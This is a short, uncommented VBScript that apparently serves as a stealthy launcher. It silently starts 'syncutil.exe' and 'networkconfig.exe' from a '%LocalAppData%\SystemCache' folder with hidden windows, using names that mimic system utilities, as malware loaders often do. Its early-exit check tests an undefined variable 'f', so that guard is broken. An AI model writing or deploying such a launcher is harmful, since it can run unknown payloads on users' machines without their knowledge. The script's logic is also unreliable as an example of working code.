Dim c, d, e

Set c = CreateObject("WScript.Shell")
Set d = CreateObject("Scripting.FileSystemObject")

e = c.ExpandEnvironmentStrings("%LocalAppData%\SystemCache")
If d.FileExists(f) Then
    WScript.Quit
End If

If d.FileExists(e & "\syncutil.exe") Then
    c.Run Chr(34) & e & "\syncutil.exe" & Chr(34), 0, False
End If

If d.FileExists(e & "\networkconfig.exe") Then
    c.Run Chr(34) & e & "\networkconfig.exe" & Chr(34), 0, False
End If

Set c = Nothing
Set d = Nothing
